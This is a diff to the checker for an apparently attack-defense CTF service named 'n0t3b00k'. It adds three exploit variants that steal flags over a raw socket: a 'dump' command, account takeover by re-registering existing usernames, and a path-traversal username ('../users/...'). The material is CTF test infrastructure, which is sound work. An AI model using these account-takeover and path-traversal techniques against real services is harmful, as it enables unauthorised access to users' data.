@@ -29,6 +29,7 @@ class N0t3b00kChecker(BaseChecker):
     flag_variants = 1
     noise_variants = 1
     havoc_variants = 3
+    exploit_variants = 3
     service_name = "n0t3b00k"
     port = 2323  # The port will automatically be picked up as default by self.connect and self.http.
     ##### END CHECKER PARAMETERS
@@ -378,8 +379,52 @@ class N0t3b00kChecker(BaseChecker):
                 If nothing is returned, the service status is considered okay.
                 The preferred way to report Errors in the service is by raising an appropriate EnoException
         """
-        # TODO: We still haven't decided if we want to use this function or not. TBA
-        pass
+        if self.variant_id == 0:
+            conn = self.connect()
+            welcome = conn.read_until(">")
+            conn.write(b"dump\nexit\n")
+            data = conn.read_all()
+            if flag := self.search_flag_bytes(data):
+                return flag
+            raise BrokenServiceException("flag not found")
+        elif self.variant_id == 1:
+            conn = self.connect()
+            welcome = conn.read_until(">")
+            conn.write(b"user\n")
+            user_list = conn.read_until(b">").split(b"\n")[:-1]
+            for user in user_list:
+                user_name = user.split()[-1]
+                conn.write(b"reg %s foo\nlog %s foo\n list\n" % (user_name, user_name))
+                conn.read_until(b">")  # successfully registered
+                conn.read_until(b">")  # successfully logged in
+                notes_list = conn.read_until(b">").split(b"\n")[:-1]
+                for note in notes_list:
+                    note_id = note.split()[-1]
+                    conn.write(b"get %s\n" % note_id)
+                    data = conn.read_until(b">")
+                    if flag := self.search_flag_bytes(data):
+                        return flag
+            raise BrokenServiceException("flag not found")
+        elif self.variant_id == 2:
+            conn = self.connect()
+            welcome = conn.read_until(">")
+            conn.write(b"user\n")
+            user_list = conn.read_until(b">").split(b"\n")[:-1]
+            for user in user_list:
+                user_name = user.split()[-1]
+                conn.write(b"reg ../users/%s foo\nlog %s foo\n list\n" % (user_name, user_name))
+                conn.read_until(b">")  # successfully registered
+                conn.read_until(b">")  # successfully logged in
+                notes_list = conn.read_until(b">").split(b"\n")[:-1]
+                for note in notes_list:
+                    note_id = note.split()[-1]
+                    conn.write(b"get %s\n" % note_id)
+                    data = conn.read_until(b">")
+                    if flag := self.search_flag_bytes(data):
+                        return flag
+            raise BrokenServiceException("flag not found")
+
+        raise EnoException("wrong variant_id provided")
 
 
 app = N0t3b00kChecker.service  # This can be used for uswgi.
